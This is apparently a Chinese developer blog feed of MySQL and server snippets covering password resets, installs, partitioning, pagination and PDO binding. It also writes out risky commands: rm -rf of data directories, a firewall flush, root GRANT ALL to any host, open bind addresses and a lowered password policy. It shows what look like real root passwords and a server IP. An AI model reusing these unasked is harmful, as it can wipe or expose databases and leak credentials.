WEB 请求，输入时 Request，输出是 Response；对于 CLI，输入是 argument + option 命令行变量构成的 Input 对象，输出则是展示在终端的 Output 对象。所以，依赖注入(IoC 容器) 是 Laravel 的基石，真正干活的是 Kernel。https://laravel-china.org/articles/20507 Facades 原理 (代码执行流程分析) Laravel 源码阅读之二：Illuminate\Foundation\Application 类初始化分析 Laravel Queue——消息队列任务与分发源码剖析 Laravel Service Provider 概念详解 Laravel核心代码学习 Laravel 启动流程分析 (代码全流程) 生命周期 5 管道流分析 Laravel 5.7 嵌套集基础教程 laravel-mysql读写分离 Laravel 框架涉及的各种软件理念和工具 Lumen 进阶之数据库交互 Laravel 开发 RESTful API 的心得 深入研究 larvael 源码第三天 Laravel队列实现原理解决问题记录 LARAVEL 生命周期解析 搭建 Laravel 运行环境线上 LNMP Laravel 源码阅读指南 – PHP 类的反射和依赖注入 自动化测试：六个值得参考的 Laravel 开源项目 Laravel 源码阅读指南 – Contracts 契约 Laravel 入门指南 Laravel Eloquent 提示和技巧 laravel Elasticsearch 实现简单搜索]]></content>
      <tags>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql片段收集]]></title>
    <url>%2F2019%2F01%2F07%2Fmysql%E7%89%87%E6%AE%B5%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[Mysql使用别名多表查询join时问题12345SELECT * FROM t1, t2 LEFT JOIN t3 ON (t1.id=t3.id) WHERE t1.id=t2.id但是在执行的时候报错“Unknown column t1.id”,以前博主习惯利用AS 表别名来进行多表关联查询，这让博主很凌乱，一时不知道如何下手解决了实际上执行 SELECT * FROM t1,( t2 LEFT JOIN t3 ON (t1.id=t3.id)) WHERE t1.id=t2.idSELECT * FROM t1 INNER JOIN t2 LEFT JOIN t3 ON (t1.id=t3.id) WHERE t1.id=t2.id 重置root密码123456789101112131415161718192021222324252627282930313233343536373839404142434445kill `cat /mysql-data-directory/host_name.pid`#ps方法ps aux|grep 'mysql'#这里把%pid%替换为上面ps给的进程idsudo kill %pid%#5.7.6和以后版本ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyNewPass';#5.7.6以前版本SET PASSWORD FOR 'root'@'localhost' = PASSWORD('MyNewPass');#官网手册命令，mac用户不推荐 mysqld_safe --init-file=/home/me/mysql-init &amp; #mac用户推荐命令 sudo /usr/local/mysql/bin/mysqld --user=_mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --log-error=/usr/local/mysql/data/mysqld.local.err --pid-file=/usr/local/mysql/data/mysqld.local.pid --init-file=/Users/king/sql/alter_root.sql &amp;1. 停止mysql服务:systemctl stop mysqld2. 设置mysql的环境变量参数 systemctl set-environment MYSQLD_OPTS="--skip-grant-tables"3. 启动mysql服务systemctl start mysqld4. root无密码登录mysql -u root5. 更新root密码mysql&gt; UPDATE mysql.user SET authentication_string = PASSWORD('MyNewPassword') -&gt; WHERE User = 'root' AND Host = 'localhost';mysql&gt; FLUSH PRIVILEGES;mysql&gt; quit6. 关闭mysql服务systemctl stop mysqld7. 删除mysql环境参数systemctl unset-environment MYSQLD_OPTS8. 再次启动:systemctl start mysqld9. 用root登录:. mysql -u root -p mysql5.7无法远程连接问题1234567891011mysql -uroot -p use mysql; select * from user\G;sudo iptables -L #查看防火墙规则列表 sudo iptables -F #清空防火墙列表vi /etc/mysql/mysql.conf.d/mysqld.cnf#bind-address = 127.0.0.1bind-address = 0.0.0.0 select *导致的mysql线程sending data1234567当有大量的”select * from xxx”存在时，虽然这个表的数据量不是很大，只有区区几千条记录记录，但是大量的查询引起mysql线程状态卡在”sending data”时，服务器的负载就上来了。那么什么是”sending data”状态哪?其实这是一个很容易引起误导的状态说明，”sending data”是包含读取数据+发送数据的。这里以innodb存储引擎来说，我们在使用索引找到我们所需的记录时，期初得到是索引列信息和主键信息，如果我们查询的信息索引列中已经包含，那么万事大吉，mysql会把这些信息发送给客户端。但是如果像我的例子中的是使用”select *”这种情况，或者要索引列中未包含我们需要需要的更多信息，那么这时mysql就会拿着主键id去数据行获取信息，然后再把些信息发送给客户端。现在回到上面的问题，我们数据表记录数不多，为什么会引起”sending data”哪?我们活动信息表有几个字段是MEDIUMTEXT或者VARCHAR(3000)类似这种要存储比较长字符串内容的字段，所以在使用”select *”时我们把本来不需要，但是却占用很大空间的字段也返回了，造成了大量无用的IO操作，这里包含读取数据和发送数据。由于接口我们使用的是被动缓存，所以活动刚开始时这些请求都打到了数据库，后面接口缓存生效以后数据库压力就降下来了。开发框架使用的是Lumen,而且我们主要使用的是里面的ORM-Elopment,有些地方没有注意查询时设定字段就引起了这个问题，说句实话以前在使用ORM时，我一直没有养成限制返回字段的习惯。希望看到这篇文章的同学也能引以为戒，以后尽量不要使用”seleect *”这样粗暴的查询方式。 lumen数据库时区设置1234567891011http://www.helpergarden.com/2018/05/lumen%e6%95%b0%e6%8d%ae%e5%ba%93%e6%97%b6%e5%8c%ba%e8%ae%be%e7%bd%ae.htmltimestamp里面居然保存的居然是带时区的查看ORM源码，它的注释里面说日期类型的字符创会转化成“DateTime/Carbon”实例，然后再进一步处理是输出或者存入数据库。我们可以通过在.env中设置”DB_TIMEZONE”来解决时区不一致的问题。DB_TIMEZONE=+8:00一般来说要保证我们设置DB_TIMEZONE和APP_TIMEZONE一致的，所以一般配置文件都是这样的。APP_TIMEZONE=Asia/ShanghaiDB_TIMEZONE=+8:00 nginx跨域设置123456789101112131415location / &#123; index index.html index.htm index.php; autoindex on; try_files $uri $uri/ /index.php?$query_string;&#125;include cors.conf;vi cors.conf add_header Access-Control-Allow-Origin *;add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS';add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';if ($request_method = 'OPTIONS') &#123; return 204;&#125; swoole process父子进程使用队列通信1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//http://www.helpergarden.com/2018/05/swoole-process%e7%88%b6%e5%ad%90%e8%bf%9b%e7%a8%8b%e4%bd%bf%e7%94%a8%e9%98%9f%e5%88%97%e9%80%9a%e4%bf%a1.html$worker_num = 2;$process_pool = [];$process= null;$pid = posix_getpid();function sub_process(swoole_process $worker)&#123; sleep(1); //防止父进程还未往消息队列中加入内容直接退出 echo "worker ".$worker-&gt;pid." started".PHP_EOL; while($msg = $worker-&gt;pop())&#123; if ($msg === false) &#123; break; &#125; $sub_pid = $worker-&gt;pid; echo "[$sub_pid] msg : $msg".PHP_EOL; sleep(1);//这里的sleep模拟必须，否则可能1个worker就把所有信息全接受了 &#125; echo "worker ".$worker-&gt;pid." exit".PHP_EOL; $worker-&gt;exit(0);&#125;$customMsgKey = 1;//默认为空，这个地方可以随便填的$mod = 2 | swoole_process::IPC_NOWAIT;//这里设置队列为非阻塞模式//创建worker进程for($i=0;$i&lt;$worker_num; $i++) &#123; $process=new swoole_process('sub_process'); $process-&gt;useQueue($customMsgKey, $mod); $process-&gt;start(); $pid = $process-&gt;pid; $process_pool[$pid] = $process;&#125;$messages = [ "Hello World!", "Hello Cat!", "Hello King", "Hello Leon", "Hello Rose"];//由于所有进程是共享使用1个消息队列，所以只需向一个字进程发送消息即可$process = current($process_pool);foreach ($messages as $msg) &#123; $process-&gt;push($msg);&#125;swoole_process::wait();swoole_process::wait();echo "master exit".PHP_EOL; yum安装elasticsearch1234567891011//http://www.helpergarden.com/2018/03/yum%e5%ae%89%e8%a3%85elasticsearch.htmlyum install javayum makecacheyum install elasticsearchcd /usr/share/elasticsearch./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.2.2/elasticsearch-analysis-ik-6.2.2.zip systemctl start elasticsearchcurl http://127.0.0.1:9200访问“http://127.0.0.1:9200/_cat/plugins”可以查看es安装的插件。curl http://127.0.0.1:9200/_cat/plugins grant123456mysql&gt;grant select,delete,update,create,drop on *.* to test@"%" identified by "1234"; //test用户对所有数据库都有select,delete,update,create,drop 权限。https://laravel-china.org/articles/22147 @"%" 表示对所有非本地主机授权，不包括localhost。 对localhost授权：加上一句grant all privileges on testDB.* to test@localhost identified by '1234';即可 EXPLAIN 查看SQL执行计划12345EXPLAIN SELECT ……EXPLAIN EXTENDED SELECT ……将执行计划"反编译"成SELECT语句，运行SHOW WARNINGS，可得到被MySQL优化器优化后的查询语句。EXPLAIN PARTITIONS SELECT ……用于分区表的EXPLAIN生成QEP的信息 卸载mysql8123456789101112131415161718192021222324252627282930[root@VM_0_14_centos ~]# rpm -qa|grep mysqlmysql80-community-release-el7-1.noarchmysql-community-client-8.0.13-1.el7.x86_64mysql-community-libs-8.0.13-1.el7.x86_64mysql-community-libs-compat-8.0.13-1.el7.x86_64php70w-mysqlnd-7.0.32-1.w7.x86_64mysql-community-common-8.0.13-1.el7.x86_64mysql-community-server-8.0.13-1.el7.x86_64yum remove mysql80-community-release-el7-1.noarch[root@VM_0_14_centos ~]# find / -name mysql/etc/selinux/targeted/tmp/modules/100/mysql/etc/selinux/targeted/active/modules/100/mysql/var/lib/mysql/var/lib/mysql/mysql/var/lib/docker/volumes/68a07333528e60edd5980282ae6b0a3ce2324021eb8ca2f1963adb5a199ade7a/_data/mysql/var/lib/docker/volumes/f17d91c72d0178c3746414175662884b29c462146c18fcf775c139a875dbd746/_data/mysql/var/lib/docker/volumes/f8f07e5586d9f47cb5ec67a6b1fcd174c60446091e75ad0a920d58afefc8c405/_data/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/etc/init.d/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/etc/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/var/lib/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/var/log/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/usr/bin/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/usr/lib/mysql/var/lib/docker/overlay2/68559b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/usr/share/mysqlrm -rf /var/lib/mysqlrm -rf /etc/my.cnfrm -rf /var/log/mysqld.log 安装mysql5.7123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101wget http://dev.mysql.com/get/mysql57-community-release-el7-8.noarch.rpmyum localinstall mysql57-community-release-el7-8.noarch.rpmyum repolist enabled | grep "mysql.*-community.*"mysql&gt; system yum repolist enabled | grep "mysql.*-community.*"Repository epel is listed more than once in the configurationmysql-connectors-community/x86_64 MySQL Connectors Community 74mysql-tools-community/x86_64 MySQL Tools Community 74mysql57-community/x86_64 MySQL 5.7 Community Server 307 [root@VM_0_14_centos ~]# yum install mysql-community-server grep 'temporary password' /var/log/mysqld.log Loaded plugins: fastestmirror, langpacks Repository epel is listed more than once in the configuration Determining fastest mirrors * nux-dextop: li.nux.ro * webtatic: us-east.repo.webtatic.com Package mysql-community-server-5.7.24-1.el7.x86_64 already installed and latest version Nothing to do [root@VM_0_14_centos ~]# grep 'temporary password' /var/log/mysqld.log [root@VM_0_14_centos ~]# [root@VM_0_14_centos ~]# service mysqld restart Redirecting to /bin/systemctl restart mysqld.service [root@VM_0_14_centos ~]# /bin/systemctl restart mysqld.service [root@VM_0_14_centos ~]# ps aux|grep mysql systemd+ 765 0.0 0.2 1121296 4316 ? Ssl 2018 38:00 mysqld mysql 11499 0.3 8.8 1119512 166152 ? Sl 17:47 0:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid root 11769 0.0 0.0 112708 964 pts/3 R+ 17:49 0:00 grep --color=auto mysql [root@VM_0_14_centos ~]# which mysqld /usr/sbin/mysqld [root@VM_0_14_centos ~]# lsof -i:3306 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME mysqld 11499 mysql 18u IPv6 60264974 0t0 TCP *:mysql (LISTEN) [root@VM_0_14_centos ~]# grep 'password' /var/log/mysqld.log 2019-01-14T09:46:16.712229Z 1 [Note] A temporary password is generated for root@localhost: RpvpdgHKZ5;* 2019-01-14T09:47:39.920810Z 0 [Note] Shutting down plugin 'validate_password' 2019-01-14T09:47:41.646659Z 0 [Note] Shutting down plugin 'sha256_password' 2019-01-14T09:47:41.646662Z 0 [Note] Shutting down plugin 'mysql_native_password' [root@VM_0_14_centos ~]# mysql -uroot -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \g. Your MySQL connection id is 2 Server version: 5.7.24mysql&gt; use mysqlERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.mysql&gt; ALTER USER 'root'@'localhost' IDENTIFIED BY '*SUsheng*';ERROR 1819 (HY000): Your password does not satisfy the current policy requirementsmysql&gt; ALTER USER 'root'@'localhost' IDENTIFIED BY '*SUsheng123*';Query OK, 0 rows affected (0.00 sec)GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'YourPassword9#' WITH GRANT OPTION;修改/etc/my.cnf配置文件，在[mysqld]下添加编码配置vim /etc/my.cnf[mysqld]character_set_server=utf8init_connect='SET NAMES utf8'λ mysql -h 118.24.158.116 -uroot -pEnter password: ***********Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.24 MySQL Community Server (GPL)mysql5.7 以后的争强了安全机制,所以使用yum安装,启动会系统会自动生成一个随机的密码，并且不能设置简单密码。所以需要修改 mysql 全局参数先用日志密码登录 mysql grep 'temporary password' /var/log/mysqld.log会输出结果: A temporary password is generated for root@localhost: ******使用此密码登录后 执行 SHOW VARIABLES LIKE 'validate_password%‘; 查看 mysql 密码策略+--------------------------------------+--------+| Variable_name | Value |+--------------------------------------+--------+| validate_password_check_user_name | OFF | | validate_password_dictionary_file | || validate_password_length | 8 || validate_password_mixed_case_count | 1 || validate_password_number_count | 1 || validate_password_policy | MEDIUM | | validate_password_special_char_count | 1 |+--------------------------------------+--------+执行 set global validate_password_policy=LOW; 修改密码策略执行 set global validate_password_length=6; 修改验证密码长度切换 user 库update user set authentication_string = password('root'), password_expired = 'N', password_last_changed = now() where user = 'root';重启 mysqld 服务，再用新密码登录即可如果无法登录,提示Access denied for user 'root'@'localhost'重新更新 root 用户的 plugin 字段update user set plugin='mysql_native_password' where user = 'root';更新成功后.重新执行更新密码操作刷新权限 flush privileges; 查看实时执行的SQL语句12345678910111213141516171819202122232425262728293031323334mysql&gt; SHOW VARIABLES LIKE "general_log%";如下general_log值为OFF说明没有开启：+------------------+----------------------------------+| Variable_name | Value |+------------------+----------------------------------+| general_log | OFF || general_log_file | /var/lib/mysql/galley-pc.log |+------------------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; SET GLOBAL general_log = 'ON';mysql&gt; SET GLOBAL general_log_file = '/var/log/mysql/general_log.log';永久有效需要配置my.cnf文件，加入下面两行：general_log = 1general_log_file = /var/log/mysql/general_sql.log$ tail -f /var/lib/mysql/general_sql.log/usr/sbin/mysqld, Version: 5.7.24 (MySQL Community Server (GPL)). started with:Tcp port: 3306 Unix socket: /var/lib/mysql/mysql.sockTime Id Command Argument2019-01-15T08:45:47.794791Z 137 Query SHOW VARIABLES LIKE 'general%'直接使用 /etc/mysql/debian.cnf 文件中 [client] 节提供的用户名和密码mysql -u*** -p切换到 mysql 数据库use mysql;更新密码update user set authentication_string = password('root'), password_expired = 'N', password_last_changed = now() where user = 'root';刷新权限 flush privileges;重启 mysqld 服务，再用新密码登录即可如果无法登录,提示 Access denied for user 'root'@'localhost'重新更新 root 用户的 plugin 字段update user set plugin='mysql_native_password' where user = 'root';更新成功后.重新执行更新密码操作 Can’t connect to local MySQL server1234567891011121314151617181920212223242526272829303132333435[root@localhost app]# mysqlERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)[root@localhost app]# mysql -uroot -pEnter password: ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)查询自己的 mysql.sock文件发现自己的路径在 [root@localhost data]# find / -name mysql.sock/tmp/mysql.sock则在 my.cnf 中添加指定 mysql.sock文件[root@localhost data]# vim /etc/my.cnf[mysqld]socket=/tmp/mysql.sockfack!! 重启mysql服务问题依旧存在于是添加软连接[root@localhost data]# mkdir -pv /var/lib/mysqlmkdir: 已创建目录 “/var/lib/mysql”[root@localhost data]# ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock[root@localhost data]# mysqlWelcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.6.16 Source distributionCopyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt; Access denied for user ‘root‘@’localhost’12345678910111213141516171819202122232425262728# /etc/init.d/mysqld stop //停止mysql服务的运行# mysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp; //跳过受权表访问# mysql -u root mysql //登录mysql在mysql5.7以下的版本如下：mysql&gt; UPDATE user SET Password=PASSWORD('newpassword') where USER='root' and host='127.0.0.1' or host='localhost';//把空的用户密码都修改成非空的密码就行了。在mysql5.7版本如下：update mysql.user set authentication_string=password('newpassword') where user='root' and host='127.0.0.1' or host='localhost';mysql&gt; FLUSH PRIVILEGES;mysql&gt; quit # /etc/init.d/mysqld restart //离开并重启mysql# mysql -uroot -pEnter password: &lt;输入新设的密码newpassword&gt; Connection: Localhost via UNIX socketServer characterset: latin1Db characterset: latin1Client characterset: utf8Conn. characterset: utf8UNIX socket: /var/lib/mysql/mysql.sock[root@localhost ~]# ps aux|grep mysqldroot 10913 0.0 0.0 106228 1396 ? S Jan19 0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/data1/mysql --socket=/tmp/mysql.sock --pid-file=/var/run/mysqld/mysqld.pid --basedir=/usr --user=mysqlmysql 11147 57.8 3.4 3502672 416152 ? Sl Jan19 1706:42 /usr/sbin/mysqld --basedir=/usr --datadir=/data1/mysql --plugin-dir=/usr/lib64/mysql/plugin --user=mysql --log-error=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/tmp/mysql.sock Can’t connect to MySQL server on ‘127.0.0.1’1234567891011[root@localhost ~]# mysql -uroot -p -h 127.0.0.1Enter password:ERROR 2003 (HY000): Can't connect to MySQL server on '127.0.0.1' (111)[root@localhost ~]# grep bind /etc/my.cnfbind-address=172.16.7.27[root@localhost ~]# mysql -uroot -p -h 172.16.7.27Enter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 3979750Server version: 5.7.11 MySQL Community Server (GPL)Connection: 172.16.7.27 via TCP/IP#和通过socket链接不同 转换编码1234567891011#!/bin/bashDIR=$1 # 转换编码文件目录https://tonydeng.github.io/2015/11/27/batch-conversion-file-encoding/FT=$2 # 需要转换的文件类型（扩展名）SE=$3 # 原始编码DE=$4 # 目标编码for file in `find $DIR -type f -name "*.$FT"`; do echo "conversion $file encoding $SE to $DE" iconv -f $SE -t $DE "$file" &gt; "$file".tmp mv -f "$file".tmp "$file"done//./batch_conversion_encoding.sh ~/sdk1 java GBK UTF8 安装 MySQL8.0.131234567891011121314151617181920212223242526wget -c 'https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-8.0.13-1.el7.x86_64.rpm-bundle.tar'解压tar xvf mysql-8.0.13-1.el7.x86_64.rpm-bundle.tar安装yum install mysql-community-libs-8.0.13-1.el7.x86_64.rpmyum install mysql-community-libs-compat-8.0.13-1.el7.x86_64.rpmyum install mysql-community-client-8.0.13-1.el7.x86_64.rpmyum install mysql-community-server-8.0.13-1.el7.x86_64.rpm设置数据库https://laravel-china.org/articles/22686初次安装没进去，在/etc/my.cnf 中添加 skip-grant-tables, 使用mysql -uroot 直接进入数据库，修改root账号密码：alter user 'root'@'localhost' identified by '**';mysql 8.0以后默认加密方式跟5.7不一样 ：ALTER USER 'root'@'localhost' IDENTIFIED BY '**' PASSWORD EXPIRE NEVER; //修改用户永不过期ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '***';//更新一下用户的密码加密方式，修改密码flush privileges; //执行完刷新权限创建新用户CREATE USER smile@% IDENTIFIED BY 'passowrd'; //# 创建账号密码GRANT ALL ON . TO smile@% WITH GRANT OPTION; //授予远程登录权限（.远程访问所有数据）REVOKE all privileges ON databasename.tablename FROM 'username'@'host'; //删除某些数据权限flush privileges;//刷新权限//不常用的 --- 创建过期用户CREATE USER smile@% IDENTIFIED BY '***' PASSWORD EXPIRE INTERVAL 90 DAY;//数据库搞定service mysqld start restart stop 查询指定数据库的所有表名称12345USE information_schema;SELECT TABLE_NAME,table_rows FROM TABLES WHERE TABLE_SCHEMA = '数据库名字' ORDER BY table_rows DESC;查询指定库的数据大小，索引大小SELECT CONCAT(ROUND(SUM(DATA_LENGTH/1024/1024),2),'MB') AS total_data_size, CONCAT(ROUND(SUM(index_length)/(1024*1024), 2), ' MB') AS total_index_size FROM TABLES WHERE table_schema = '数据库名字'; MySQL 分区表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//https://learnku.com/articles/22947如果需要定时清理一张普通大表里的历史数据。可以使用一个或多个带 where 条件的 delete 语句去删除（where条件是时间）。 如果表数据量较大，这对数据库的造成了很大压力。即使我们把这些旧数据删除了，但是底层的数据文件并没有变小。为什么没有变小？当删除数据 时，MYSQL 并不会立即回收表空间。被已删除数据的占据的存储空间，以及索引位会空在那里，等待新的数据来弥补这个空缺。强行回收： OPTIMIZE TABLEmysql&gt; SHOW PLUGINS \G;*************************** 43. row *************************** Name: partition Status: ACTIVE Type: STORAGE ENGINELibrary: NULLLicense: GPLCREATE TABLE hash_partition_test ( id INT, pdate INT)PARTITION BY HASH(id)PARTITIONS 4;CREATE TABLE range_partition_test ( id INT, pdate INT)PARTITION BY RANGE (pdate) ( PARTITION p1 VALUES LESS THAN ( 201702 ), PARTITION p2 VALUES LESS THAN ( 201703 ), PARTITION p3 VALUES LESS THAN ( 201704 ), PARTITION p4 VALUES LESS THAN (MAXVALUE));mysql&gt; select * from range_partition_test;+------+--------+| id | pdate |+------+--------+| 1 | 201701 || 2 | 201702 || 3 | 201703 || 4 | 201704 || 5 | 201705 |+------+--------+mysql&gt; explain partitions select * from range_partition_test where pdate between 201702 and 201703;+----+-------------+----------------------+------------+------+---------------+------+---------+------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+----------------------+------------+------+---------------+------+---------+------+------+----------+-------------+| 1 | SIMPLE | range_partition_test | p2,p3 | ALL | NULL | NULL | NULL | NULL | 2 | 50.00 | Using where |+----+-------------+----------------------+------------+------+---------------+------+---------+------+------+----------+-------------+ limit优化12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758MySQL的 limit m,n 工作原理就是先读取符合where条件的前面m+n条记录，然后抛弃前m条，返回后面n条，所以m越大，偏移量越大，性能就越差。这也是大部分ORM框架生成的分页sqlSELECT * FROM t_tel_record t1INNER JOIN ( SELECT f_id FROM t_tel_record WHERE f_qiye_id = xxx ORDER BY f_id DESC LIMIT 999900, 100) t2 ON t1.f_id = t2.f_idmin_id = SELECT f_idFROM t_tel_recordWHERE f_qiye_id = xxxORDER BY f_id DESCLIMIT 999900, 1 SELECT * FROM t_tel_record t1WHERE f_qiye_id = xxxAND f_id &lt; &#123;min_id&#125; + 1ORDER BY f_id DESCLIMIT 100第一页：（降序）SELECT * FROM t_tel_record t1WHERE f_qiye_id = xxxORDER BY f_id DESC LIMIT 100 获取结果集最大最小id：一般是第一条和最后一条，或者 max_id=max(f_id), min_id=min(f_id)下一页（如果有）：SELECT * FROM t_tel_record t1WHERE f_qiye_id = xxxAND f_id &lt; &#123;min_id&#125; -- min_id变量ORDER BY f_id DESC LIMIT 100 上一页（如果有）：SELECT * FROM t_tel_record t1WHERE f_qiye_id = xxxAND f_id &gt; &#123;max_id&#125; -- max_id变量ORDER BY f_id DESC LIMIT 100最后一页：（降序）SELECT * FROM ( SELECT * FROM t_tel_record t1 WHERE f_qiye_id = xxx ORDER BY f_id ASC LIMIT 100) AS tORDER BY f_id DESC 倒数第二页：(以此类推)SELECT * FROM ( SELECT * FROM t_tel_record t1 WHERE f_qiye_id = xxx ORDER BY f_id ASC LIMIT 100, 100) AS tORDER BY f_id DESC insert12345678910111213-- 将 oldUsers 表中的数据插入到 users 表INSERT INTO `users`(`email`, `name`, `password`) SELECT `email`, `name`, `password` FROM `oldUsers`;-- 将 users 表的数据复制到 usersCopy 表SELECT * INTO `usersCopy` FROM `users`;-- 创建新表 usersCopy 并将 users 复制过去CREATE TABLE `usersCopy` AS SELECT * FROM `users`;-- 查询 products 表中 price 与 number 的乘积并设为别名 totalSELECT `price` * `number` AS `total` FROM `products`;-- 查询 users 表中的 name 列并将其用括号括起而且设置列别名为 newNameSELECT Concat('(', `name`, ')') AS `newName` FROM `users`; bindParam 和 bindValue123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566bindParam 的作用是将变量的引用绑定到预编译的 SQL 语句中，当绑定的变量值改变时 SQL 语句随之改变。$statement = $pdo-&gt;prepare("INSERT INTO `posts` (`id`, `title`, `author`) VALUES (:id, :title, :author)");$id = 11;$title = 'new post';$author = 'unknown';$statement-&gt;bindParam(':id', $id, PDO::PARAM_INT);$statement-&gt;bindParam(':title', $title, PDO::PARAM_STR);$statement-&gt;bindParam(':author', $author, PDO::PARAM_STR);$statement-&gt;execute();$id = 12;$title = 'new post2';$author = 'unknown2';$statement-&gt;execute();// 执行代码后查询数据库显示如下// +----+-----------+----------+// | id | title | author |// +----+-----------+----------+// | 1 | new post | unknown |// | 2 | new post2 | unknown2 |// +----+-----------+----------+警告：由于 bindParam 是绑定的是变量的引用，所以在 foreach 中会出现意料之外的 BUG。示例如下：$data = [':title' =&gt; 'title', ':author' =&gt; 'author'];$statement = $pdo-&gt;prepare("INSERT INTO `posts` (`title`, `author`) VALUES (:title, :author)");foreach ($data as $key =&gt; $val) &#123; $statement-&gt;bindParam($key, $val);&#125;$statement-&gt;execute();// 执行代码后查询数据库显示如下// +----+--------+--------+// | id | title | author |// +----+--------+--------+// | 1 | author | author |// +----+--------+--------+当循环结束后 $val 的值即为数组中最后一个元素的值，而 bindParam 方法绑定的是引用而不是值，所以此时所有的占位符绑定的都是循环结束后的 $val 变量值，因此就有了这个结果。 解决这个问题我们可以用 bindValue 方法实现。bindValue 的作用是绑定值到预编译的 SQL 语句中，一经绑定 SQL 语句就固定不变。示例如下：$data = [':title' =&gt; 'title', ':author' =&gt; 'author'];$statement = $pdo-&gt;prepare("INSERT INTO `posts` (`title`, `author`) VALUES (:title, :author)");foreach ($data as $key =&gt; $val) &#123; $statement-&gt;bindValue($key, $val);&#125;$statement-&gt;execute();// 执行代码后查询数据库显示如下// +----+--------+--------+// | id | title | author |// +----+--------+--------+// | 1 | title | author |// +----+--------+--------+这样就解决了这个问题，当然我们还可以在 foreach 中使用引用的方式解决这个问题，但是不推荐。示例如下：$data = [':title' =&gt; 'title', ':author' =&gt; 'author'];$statement = $pdo-&gt;prepare("INSERT INTO `posts` (`title`, `author`) VALUES (:title, :author)");foreach ($data as $key =&gt; &amp;$val) &#123; $statement-&gt;bindParam($key, $val);&#125;$statement-&gt;execute();// 执行代码后查询数据库显示如下// +----+--------+--------+// | id | title | author |// +----+--------+--------+// | 1 | title | author |// +----+--------+--------+ 行列转换12345678910111213141516171819202122232425262728#准备示例数据create table tbl_name (ID int ,mSize varchar(100));insert into tbl_name values (1,'tiny,small,big');insert into tbl_name values (2,'small,medium');insert into tbl_name values (3,'tiny,big');#用于行列转换循环的自增表create table incre_table (AutoIncreID int);insert into incre_table values (1);insert into incre_table values (2);insert into incre_table values (3); #实现行列转换的SQLhttp://cenalulu.github.io/mysql/column-row-reverse/select a.ID,substring_index(substring_index(a.mSize,',',b.AutoIncreID),',',-1) from tbl_name ajoinincre_table bon b.AutoIncreID &lt;= (length(a.mSize) - length(replace(a.mSize,',',''))+1)order by a.ID;select a.ID,substring_index(substring_index(a.mSize,',',b.help_topic_id+1),',',-1) from tbl_name ajoinmysql.help_topic bon b.help_topic_id &lt; (length(a.mSize) - length(replace(a.mSize,',',''))+1)order by a.ID; MySQL密码12345678910111213141516171819202122232425262728293031mysql&gt; select password('root'),concat('*',sha1(unhex(sha1('root'))));+-------------------------------------------+-------------------------------------------+| password('root') | concat('*',sha1(unhex(sha1('root')))) |+-------------------------------------------+-------------------------------------------+| *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | *81f5e21e35407d884a6cd4a731aebfb6af209e1b |+-------------------------------------------+-------------------------------------------+5.6以前如果你向MySQL发送了例如create user,grant user ... identified by这样的携带初始明文密码的指令，那么会在binary log中原原本本的被还原出来。mysql [localhost] &#123;msandbox&#125; (mysql) &gt; create user plain_password identified by 'plain_pass';Query OK, 0 rows affected (0.00 sec)用mysqlbinlog查看二进制日志 http://cenalulu.github.io/mysql/myall-about-mysql-password/shell&gt; mysqlbinlog binlog.000001# at 106#150227 23:37:59 server id 1 end_log_pos 223 Query thread_id=1 exec_time=0 error_code=0use mysql/*!*/;SET TIMESTAMP=1425051479/*!*/;SET @@session.pseudo_thread_id=1/*!*/;change master to 